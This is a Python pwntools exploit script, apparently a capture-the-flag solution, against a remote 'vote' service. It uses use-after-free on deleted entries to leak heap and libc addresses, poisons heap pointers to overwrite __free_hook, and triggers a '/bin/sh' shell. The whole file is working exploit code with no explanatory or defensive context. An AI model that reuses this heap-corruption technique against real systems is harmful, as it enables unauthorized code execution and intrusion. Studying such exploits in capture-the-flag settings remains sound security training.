
from pwn import *
e = ELF('./vote')
libc = e.libc
context.terminal = ['tmux', 'new-window']
#p = process(e.path)
p = remote('69.90.132.248', 3371)

def c(x):
    p.recvuntil('> ')
    p.sendline(str(x))

def d(x):
    p.recvuntil('?\n')
    p.sendline(str(x))

def vote(x, z=True):
    c(5)
    d('y')
    d(10)
    d(x)
    d('ZZZ')
    if(z):
        d('ZZZ')
        p.recvuntil('0x')
        return '0x'+p.recvline().replace('.\n','')

def delete(idx):
    c(3)
    p.sendlineafter(': ', idx)

def update(idx, x):
    c(4)
    p.sendlineafter(': ', idx)
    p.recvuntil(': ')
    leak = p.recvline().strip()
    d(x)
    return leak

context.log_level = 'DEBUG'
libc_leak_offset = 0x12090
last_chunk_offset = 0x140e8
a = vote('A'*0x40)
b = vote('A'*0x40)

delete(a)
delete(b)
heap_leak = u64(update(b, p64(0x417fd0)+'\x00')[8:16])-0x10
print hex(heap_leak)
update(b, p64(heap_leak+last_chunk_offset)+'\x00')
W = vote('J'*0x40)
lol = vote(p64(0)*2 + p64(heap_leak+libc_leak_offset) + p64(0x40)+p64(0x78)+p64(0x4a)+p64(0x1)*2)
c(2)
libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))-0x3e7d60
print hex(libc.address)
update(lol, p64(0)*2 + p64(libc.symbols['__free_hook']) + p64(0x40)+p64(0x78)+p64(0x4a)+p64(0x1)*2)
#print p64(libc.symbols['do_system'])
print update(W, p64(libc.address+0x4efc0))
c('0'*0x18+';/bin/sh;')

p.interactive()
